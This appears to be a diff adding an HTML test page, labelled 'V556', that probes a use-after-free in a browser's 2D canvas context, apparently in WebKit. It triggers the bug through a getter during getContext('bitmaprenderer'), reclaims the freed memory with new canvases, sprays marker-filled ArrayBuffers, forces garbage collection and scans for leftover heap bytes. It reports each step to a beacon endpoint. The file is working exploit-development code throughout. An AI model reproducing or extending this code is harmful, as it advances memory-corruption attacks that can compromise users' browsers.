@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V556</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V556-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+function forceGC(){
+  var junk;
+  for(var g=0;g<30;g++){
+    junk=[];for(var j=0;j<10000;j++)junk.push({a:j,b:'x'.repeat(50)});
+    junk=null;
+  }
+}
+
+b('BOOT','V556-combined');
+
+// ===== PHASE A: NORMAL BASELINE (known-working) =====
+
+// T1: Normal canvas save — must pass
+(function(){
+  var c=document.createElement('canvas');c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.save();
+  b('T1','PASS-normal-baseline');
+})();
+
+// ===== PHASE B: BARE UAF (no AB, no beacons between UAF and operation) =====
+
+// T2: triggerUAF + immediate save — no AB, no GC, no beacon between
+// Tests: does save() work on stale freed memory (bmalloc metadata at off0 only)?
+(function(){
+  var u=triggerUAF();
+  u.ctx.save();
+  b('T2','PASS-bare-save-freed');
+})();
+
+// T3: triggerUAF + immediate lineWidth read — no AB
+(function(){
+  var u=triggerUAF();
+  var lw=u.ctx.lineWidth;
+  b('T3','PASS-bare-lw='+lw);
+})();
+
+// ===== PHASE C: SAME-TYPE RECLAIM =====
+
+// T4: UAF + new Canvas2D (reclaim) + save through dangling
+(function(){
+  var u=triggerUAF();
+  var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  u.ctx.save();
+  b('T4','PASS-reclaim-save');
+})();
+
+// T5: UAF + new Canvas2D + cross-read lineWidth
+(function(){
+  var u=triggerUAF();
+  var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  ctxN.lineWidth=42;
+  var lw=u.ctx.lineWidth;
+  b('T5','lw='+lw+' (expect 42 if alias, 1 if not reclaimed)');
+})();
+
+// T6: Reverse — write through dangling, read through new
+(function(){
+  var u=triggerUAF();
+  var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  u.ctx.lineWidth=99;
+  var lw=ctxN.lineWidth;
+  b('T6','ctxN.lw='+lw+' (expect 99 if alias)');
+})();
+
+// T7: Full API surface on same-type reclaim
+(function(){
+  var u=triggerUAF();
+  var c2=document.createElement('canvas');c2.width=100;c2.height=100;
+  var ctxN=c2.getContext('2d');
+  var r=[];
+  try{u.ctx.lineWidth=7.5;r.push('lw-w:ok')}catch(e){r.push('lw-w:ERR')}
+  try{r.push('lw-r:'+u.ctx.lineWidth)}catch(e){r.push('lw-r:ERR')}
+  try{u.ctx.globalAlpha=0.5;r.push('ga-w:ok')}catch(e){r.push('ga-w:ERR')}
+  try{r.push('ga-r:'+u.ctx.globalAlpha)}catch(e){r.push('ga-r:ERR')}
+  try{u.ctx.save();r.push('save:ok')}catch(e){r.push('save:ERR')}
+  try{u.ctx.restore();r.push('restore:ok')}catch(e){r.push('restore:ERR')}
+  try{var a=u.ctx.getContextAttributes();r.push('attrs:'+JSON.stringify(a))}catch(e){r.push('attrs:ERR')}
+  try{u.ctx.fillRect(0,0,10,10);r.push('fill:ok')}catch(e){r.push('fill:ERR')}
+  try{var cv=u.ctx.canvas;r.push('canvas:'+(cv?cv.tagName:'null'))}catch(e){r.push('canvas:ERR')}
+  b('T7',r.join('|'));
+})();
+
+// ===== PHASE D: GC ~Ref() DEREF TESTS =====
+
+// T8: UAF + null + GC (no AB spray) — stale m_canvas should be valid
+// If SURVIVED: ~Ref() deref reads stale valid m_canvas → derefCanvasBase OK
+(function(){
+  var u=triggerUAF();
+  u.ctx=null; u=null;
+  var a=0;for(var i=0;i<200;i++)a+=i;
+  forceGC();
+  b('T8','SURVIVED-gc-no-spray');
+})();
+
+// T9: UAF + AB spray (zeroed) + null + GC — m_canvas=0 → crash expected
+(function(){
+  var u=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  u.ctx=null; u=null;
+  var a=0;for(var i=0;i<200;i++)a+=i;
+  forceGC();
+  b('T9','SURVIVED-gc-zeroed-spray');
+  abs=null;
+})();
+
+// T10: UAF + AB spray with patterns at m_canvas candidate offsets + null + GC
+// Different patterns at off24/32/40/48 — crash address reveals which is m_canvas
+(function(){
+  var u=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    var u8=new Uint8Array(ab);
+    for(var j=24;j<32;j++) u8[j]=0x44;
+    for(var j=32;j<40;j++) u8[j]=0x42;
+    for(var j=40;j<48;j++) u8[j]=0x43;
+    for(var j=48;j<56;j++) u8[j]=0x45;
+  }
+  b('T10-SPRAY','patterns-written');
+  u.ctx=null; u=null;
+  var a=0;for(var i=0;i<200;i++)a+=i;
+  forceGC();
+  b('T10','SURVIVED-gc-patterns');
+  abs=null;
+})();
+
+// T11: Keep wrapper alive during GC (control) — should always survive
+(function(){
+  var u=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    var u8=new Uint8Array(ab);
+    for(var j=32;j<40;j++) u8[j]=0x42;
+  }
+  // DON'T null ctx
+  forceGC();
+  b('T11','SURVIVED-wrapper-alive');
+  abs=null;
+})();
+
+// ===== PHASE E: DOUBLE UAF (same-type reclaim then second UAF) =====
+
+// T12: alias + second UAF + AB spray — can we observe residual data?
+(function(){
+  var u=triggerUAF();
+  // Same-type reclaim
+  var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  ctxN.lineWidth=42;
+  ctxN.globalAlpha=0.75;
+  b('T12-RECLAIM','alias-lw=42-ga=0.75');
+
+  // Second UAF on c2
+  var innerCtx2=null;
+  var dict2={};
+  Object.defineProperty(dict2,'alpha',{
+    get:function(){
+      innerCtx2=c2.getContext('2d');
+      return true;
+    }
+  });
+  c2.getContext('bitmaprenderer',dict2);
+  b('T12-UAF2','second-uaf-triggered');
+
+  // AB spray
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+
+  // Check all ABs for non-zero bytes (residual from Canvas2D)
+  var found='none';
+  for(var a=0;a<50;a++){
+    var u8=new Uint8Array(abs[a]);
+    for(var j=0;j<768;j++){
+      if(u8[j]!==0){
+        var hex='';
+        for(var k=Math.max(0,j-4);k<Math.min(768,j+20);k++){
+          var v=u8[k];
+          hex+=(v<16?'0':'')+v.toString(16);
+        }
+        found='AB['+a+']:off'+j+':'+hex;
+        break;
+      }
+    }
+    if(found!=='none') break;
+  }
+  b('T12-RESIDUAL',found);
+})();
+
+b('DONE','V556-all-complete');
+</script>
+</body></html>
